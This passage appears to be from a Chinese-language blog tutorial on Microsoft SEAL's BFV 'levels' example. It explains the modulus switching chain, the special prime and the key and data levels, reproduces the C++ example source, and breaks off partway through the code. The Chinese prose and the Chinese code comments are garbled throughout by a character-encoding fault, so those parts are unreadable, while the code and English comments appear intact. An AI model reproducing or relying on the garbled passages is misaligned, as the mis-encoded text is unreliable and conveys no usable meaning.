8192;parms.set_poly_modulus_degree(poly_modulus_degree);</code></pre><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„coeff_modulusï¼Œ cç”±5ä¸ªè´¨æ•°ç»„æˆçš„50, 30, 30, 50, 50 ä½ç´ æ•°.</p><pre><code>CoeffModulus::MaxBitCount(poly_modulus_degree)</code></pre><p>returns 218 (greater than 50+30+30+50+50=210).<br>ç”±äºæ¨¡é‡åˆ‡æ¢é“¾ï¼Œ5ä¸ªç´ æ•°çš„é¡ºåºæ˜¯é‡è¦çš„ã€‚æœ€åä¸€ä¸ªè´¨æ•°æœ‰ç‰¹æ®Šçš„å«ä¹‰ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œç‰¹æ®Šè´¨æ•°â€ã€‚<br>å› æ­¤,ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®åœ¨æ¨¡åˆ‡æ¢é“¾åªæœ‰ä¸€ä¸ªæ¶‰åŠåˆ°ç‰¹æ®Šçš„prime<br>åˆ›å»ºæ‰€æœ‰å¯†é’¥å¯¹è±¡ï¼Œå¦‚SecretKeyåœ¨è¿™ä¸ªæœ€é«˜çš„å±‚æ¬¡ã€‚æ‰€æœ‰æ•°æ®å¯¹è±¡ï¼Œå¦‚å¯†æ–‡ï¼Œåªèƒ½åœ¨è¾ƒä½çš„æ°´å¹³ã€‚<br>è¿™ä¸ªç‰¹æ®Šè´¨æ•°åº”è¯¥ä¸åœ¨coeff_modulusä¸­çš„å…¶ä»–ç´ æ•°çš„æœ€å¤§è´¨æ•°ä¸€æ ·å¤§</p><p>åœ¨SEALä¸­æœ‰ä¸€ä¸ªé‡è¦çš„<code>level</code>çš„æ¦‚å¿µï¼Œæ ¹æ®ç¤ºä¾‹ä»£ç é‡Œçš„æ³¨é‡Šï¼Œå¯ä»¥ç†è§£ä¸ºSEALæ ¹æ®é»˜è®¤çš„å‚æ•°åˆ›å»ºäº†ä¸€ä¸ª<code>modulus switching chain</code> ï¼Œåœ¨åŒä¸€ä¸ªé“¾ä¸Šçš„åŠ å¯†å®ä¾‹é™¤äº†<code>coefficient modulus</code> å…¶ä»–éƒ½ç›¸åŒã€‚ä¸‹é¢ç¤ºä¾‹ä»£ç ç»™çš„ä¸€ä¸ªè§£é‡Šï¼š</p><pre><code>              special prime +---------+                                  |                                  vcoeff_modulus: &#123; 50, 30, 30, 50, 50 &#125;  +---+  Level 4 (all keys; `key level')                                           |                                           |    coeff_modulus: &#123; 50, 30, 30, 50 &#125;  +---+  Level 3 (highest `data level')                                           |                                           |        coeff_modulus: &#123; 50, 30, 30 &#125;  +---+  Level 2                                           |                                           |            coeff_modulus: &#123; 50, 30 &#125;  +---+  Level 1                                           |                                           |                coeff_modulus: &#123; 50 &#125;  +---+  Level 0 (lowest level)æœ‰æ–¹ä¾¿çš„è®¿é—®æ–¹æ³• SEALContext::ContextData SEALContext::key_context_data(): access to key level ContextDataSEALContext::first_context_data(): access to highest data level ContextDataSEALContext::last_context_data(): access to lowest level ContextData</code></pre><p>è¿™æ˜¯é€šè¿‡<code>set_coeff_modulus(CoeffModulus::Create(poly_modulus_degree, &#123; 50, 30, 30, 50, 50 &#125;))</code> æ–¹æ³•è®¾ç½®çš„</p><p>æ‰“å°ä¿¡æ¯æŸ¥çœ‹</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093830.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093830.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093828226"></p><h3 id="éªŒè¯keysçº§åˆ«ã€‚">éªŒè¯keysçº§åˆ«ã€‚</h3><pre class="language-c" data-language="c"><code class="language-c">KeyGenerator <span class="token function">keygen</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> secret_key <span class="token operator">=</span> keygen<span class="token punctuation">.</span><span class="token function">secret_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>PublicKey public_key<span class="token punctuation">;</span>keygen<span class="token punctuation">.</span><span class="token function">create_public_key</span><span class="token punctuation">(</span>public_key<span class="token punctuation">)</span><span class="token punctuation">;</span>RelinKeys relin_keys<span class="token punctuation">;</span>keygen<span class="token punctuation">.</span><span class="token function">create_relin_keys</span><span class="token punctuation">(</span>relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Print the parameter IDs of generated elements."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + public_key:  "</span> <span class="token operator">&lt;&lt;</span> public_key<span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + secret_key:  "</span> <span class="token operator">&lt;&lt;</span> secret_key<span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + relin_keys:  "</span> <span class="token operator">&lt;&lt;</span> relin_keys<span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span></code></pre><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093819.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093819.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093815038"></p></div><h2 id="éªŒè¯å¯†æ–‡Ciphertextçº§åˆ«">éªŒè¯å¯†æ–‡Ciphertextçº§åˆ«</h2><div class="story post-story"><pre class="language-c" data-language="c"><code class="language-c">Plaintext <span class="token function">plain</span><span class="token punctuation">(</span><span class="token string">"1x^3 + 2x^2 + 3x^1 + 4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Ciphertext encrypted<span class="token punctuation">;</span>encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + plain:       "</span> <span class="token operator">&lt;&lt;</span> plain<span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" (not set in BFV)"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + encrypted:   "</span> <span class="token operator">&lt;&lt;</span> encrypted<span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span></code></pre><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093801.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093801.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093759931"></p><h3 id="â€œModulus-switchingâ€">â€œModulus switchingâ€</h3><p>â€œModulus switchingâ€æ˜¯ä¸€ç§é™ä½å¯†æ–‡å‚æ•°çš„æŠ€æœ¯åœ¨é“¾ä¸­ Evaluator::mod_switch_to_nextæ€»æ˜¯åˆ‡æ¢åˆ°<br>ä¸‹ä¸€çº§é“¾ï¼Œè€ŒEvaluator::mod_switch_toåˆ‡æ¢åˆ°åœ¨å¯¹åº”äºç»™å®šparms_idçš„é“¾ä¸Šè®¾ç½®çš„å‚æ•°ã€‚ç„¶è€Œ,å®ƒ<br>æ˜¯ä¸å¯èƒ½åœ¨é“¾æ¡å‘ä¸Šåˆ‡æ¢çš„ã€‚</p><p>éªŒè¯:</p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><code class="language-c"><span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Perform modulus switching on encrypted and print."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>context_data <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">first_context_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"---->"</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>context_data<span class="token operator">-></span><span class="token function">next_context_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">" Level (chain index): "</span> <span class="token operator">&lt;&lt;</span> context_data<span class="token operator">-></span><span class="token function">chain_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"      parms_id of encrypted: "</span> <span class="token operator">&lt;&lt;</span> encrypted<span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"      Noise budget at this level: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\\"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">" \\-->"</span><span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">mod_switch_to_next_inplace</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>    context_data <span class="token operator">=</span> context_data<span class="token operator">-></span><span class="token function">next_context_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">" Level (chain index): "</span> <span class="token operator">&lt;&lt;</span> context_data<span class="token operator">-></span><span class="token function">chain_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"      parms_id of encrypted: "</span> <span class="token operator">&lt;&lt;</span> encrypted<span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"      Noise budget at this level: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\\"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">" \\-->"</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">" End of chain reached"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span></code></pre>              </div>            </details><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093724.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093724.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093722716"></p><h1>æºä»£ç </h1><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"examples.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"seal/seal.h"</span></span>using namespace std<span class="token punctuation">;</span>using namespace seal<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">example_levels</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">print_example_banner</span><span class="token punctuation">(</span><span class="token string">"Example: Levels"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>EncryptionParameters <span class="token function">parms</span><span class="token punctuation">(</span>scheme_type<span class="token operator">::</span>bfv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> poly_modulus_degree <span class="token operator">=</span> <span class="token number">8192</span><span class="token punctuation">;</span>parms<span class="token punctuation">.</span><span class="token function">set_poly_modulus_degree</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*    åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„coeff_modulusï¼Œ cç”±5ä¸ªè´¨æ•°ç»„æˆçš„50, 30, 30, 50, 50 ä½ç´ æ•°.         CoeffModulus::MaxBitCount(poly_modulus_degree)    returns 218 (greater than 50+30+30+50+50=210).ç”±äºæ¨¡é‡åˆ‡æ¢é“¾ï¼Œ5ä¸ªç´ æ•°çš„é¡ºåºæ˜¯é‡è¦çš„ã€‚æœ€åä¸€ä¸ªè´¨æ•°æœ‰ç‰¹æ®Šçš„å«ä¹‰ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œç‰¹æ®Šè´¨æ•°â€ã€‚å› æ­¤,ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®åœ¨æ¨¡åˆ‡æ¢é“¾åªæœ‰ä¸€ä¸ªæ¶‰åŠåˆ°ç‰¹æ®Šçš„primeåˆ›å»ºæ‰€æœ‰å¯†é’¥å¯¹è±¡ï¼Œå¦‚SecretKeyåœ¨è¿™ä¸ªæœ€é«˜çš„å±‚æ¬¡ã€‚æ‰€æœ‰æ•°æ®å¯¹è±¡ï¼Œå¦‚å¯†æ–‡ï¼Œåªèƒ½åœ¨è¾ƒä½çš„æ°´å¹³ã€‚è¿™ä¸ªç‰¹æ®Šè´¨æ•°åº”è¯¥ä¸åœ¨coeff_modulusä¸­çš„å…¶ä»–ç´ æ•°çš„æœ€å¤§è´¨æ•°ä¸€æ ·å¤§                  special prime +---------+                                      |                                      v    coeff_modulus: &#123; 50, 30, 30, 50, 50 &#125;  +---+  Level 4 (all keys; `key level')                                               |                                               |        coeff_modulus: &#123; 50, 30, 30, 50 &#125;  +---+  Level 3 (highest `data level')                                               |                                               |            coeff_modulus: &#123; 50, 30, 30 &#125;  +---+  Level 2                                               |                                               |                coeff_modulus: &#123; 50, 30 &#125;  +---+  Level 1                                               |                                               |                    coeff_modulus: &#123; 50 &#125;  +---+  Level 0 (lowest level)*/</span>    parms<span class="token punctuation">.</span><span class="token function">set_coeff_modulus</span><span class="token punctuation">(</span>CoeffModulus<span class="token operator">::</span><span class="token function">Create</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">50</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œplain_modulusæ²¡æœ‰å‘æŒ¥å¤ªå¤§çš„ä½œç”¨;æˆ‘ä»¬é€‰æ‹©ä¸€äº›åˆç†çš„ä»·å€¼    */</span>    parms<span class="token punctuation">.</span><span class="token function">set_plain_modulus</span><span class="token punctuation">(</span>PlainModulus<span class="token operator">::</span><span class="token function">Batching</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    SEALContext <span class="token function">context</span><span class="token punctuation">(</span>parms<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_parameters</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    * æœ‰æ–¹ä¾¿çš„è®¿é—®æ–¹æ³• SEALContext::ContextData         SEALContext::key_context_data(): access to key level ContextData        SEALContext::first_context_data(): access to highest data level ContextData        SEALContext::last_context_data(): access to lowest level ContextData    */</span>    <span class="token comment">//éå†è¯¥é“¾å¹¶æ‰“å°æ¯ç»„å‚æ•°çš„parms_idã€‚</span>    <span class="token comment">//é¦–å…ˆæ‰“å°å…³é”®çº§åˆ«å‚æ•°ä¿¡æ¯</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Print the modulus switching chain."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">auto</span> context_data <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">key_context_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"----> Level (chain index): "</span> <span class="token operator">&lt;&lt;</span> context_data<span class="token operator">-></span><span class="token function">chain_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">" ...... key_context_data()"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"      parms_id: "</span> <span class="token operator">&lt;&lt;</span> context_data<span class="token operator">-></span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"      coeff_modulus primes: "</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> hex<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> prime <span class="token operator">:</span> context_data<span class="token operator">-></span><span class="token function">parms</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">coeff_modulus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> prime<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> dec <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\\"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">" \\-->"</span><span class="token punctuation">;</span>        <span class="token comment">//æ¥ä¸‹æ¥è¿­ä»£å…¶ä½™çš„</span>    context_data <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">first_context_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>context_data<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">" Level (chain index): "</span> <span class="token operator">&lt;&lt;</span> context_data<span class="token operator">-></span><span class="token function">chain_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>context_data<span class="token operator">-></span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> context<span class="token punctuation">.</span><span class="token function">first_parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">" ...... first_context_data()"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>context_data<span class="token operator">-></span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> context<span class="token punctuation">.</span><span class="token function">last_parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">" ...... last_context_data()"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"      parms_id: "</span> <span class="token operator">&lt;&lt;</span> context_data<span class="token operator">-></span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"      coeff_modulus primes: "</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> hex<span class="token punctuation">;</span> <span class="token comment">// 16è¿›åˆ¶è¾“å‡º</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> prime <span class="token operator">:</span> context_data<span class="token operator">-></span><span class="token function">parms</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">coeff_modulus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cout <span class="token operator">&lt;&lt;</span> prime<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cout <span class="token operator">&lt;&lt;</span> dec <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\\"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">" \\-->"</span><span class="token punctuation">;</span>        <span class="token comment">/*        Step forward in the chain.        */</span>        context_data <span class="token operator">=</span> context_data<span class="token operator">-></span><span class="token function">next_context_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">" End of chain reached"</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">//æˆ‘ä»¬åˆ›å»ºä¸€äº›keyså¹¶æ£€æŸ¥å®ƒä»¬æ˜¯å¦ç¡®å®å‡ºç°åœ¨æœ€é«˜å±‚ã€‚</span>    KeyGenerator <span class="token function">keygen</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> secret_key <span class="token operator">=</span> keygen<span class="token punctuation">.</span><span class="token function">secret_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    PublicKey public_key<span class="token punctuation">;</span>    keygen<span class="token punctuation">.</span><span class="token function">create_public_key</span><span class="token punctuation">(</span>public_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    RelinKeys relin_keys<span class="token punctuation">;</span>    keygen<span class="token punctuation">.</span><span class="token function">create_relin_keys</span><span class="token punctuation">(</span>relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Print the parameter IDs of generated elements."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + public_key:  "</span> <span class="token operator">&lt;&lt;</span> public_key<span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + secret_key:  "</span> <span class="token operator">&lt;&lt;</span> secret_key<span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + relin_keys:  "</span> <span class="token operator">&lt;&lt;</span> relin_keys<span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    Encryptor <span class="token function">encryptor</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> public_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    Evaluator <span class="token function">evaluator</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    Decryptor <span class="token function">decryptor</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    * åœ¨BFVæ–¹æ¡ˆä¸­ï¼Œæ˜æ–‡ä¸æºå¸¦parms_idï¼Œè€Œå¯†æ–‡æºå¸¦parms_idã€‚    è¯·æ³¨æ„æ–°åŠ å¯†çš„å¯†æ–‡å¦‚ä½•åœ¨æœ€é«˜æ•°æ®çº§åˆ«ã€‚    */</span>    Plaintext <span class="token function">plain</span><span class="token punctuation">(</span><span class="token string">"1x^3 + 2x^2 + 3x^1 + 4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Ciphertext encrypted<span class="token punctuation">;</span>    encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> encrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + plain:       "</span> <span class="token operator">&lt;&lt;</span> plain<span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" (not set in BFV)"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + encrypted:   "</span> <span class="token operator">&lt;&lt;</span> encrypted<span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment">/*    * â€œModulus switchingâ€æ˜¯ä¸€ç§é™ä½å¯†æ–‡å‚æ•°çš„æŠ€æœ¯åœ¨é“¾ä¸­ Evaluator::mod_switch_to_nextæ€»æ˜¯åˆ‡æ¢åˆ°    ä¸‹ä¸€çº§é“¾ï¼Œè€ŒEvaluator::mod_switch_toåˆ‡æ¢åˆ°åœ¨å¯¹åº”äºç»™å®šparms_idçš„é“¾ä¸Šè®¾ç½®çš„å‚æ•°ã€‚ç„¶è€Œ,å®ƒ    æ˜¯ä¸å¯èƒ½åœ¨é“¾æ¡å‘ä¸Šåˆ‡æ¢çš„ã€‚    */</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Perform modulus switching on encrypted and print."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    context_data <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">first_context_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"---->"</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token 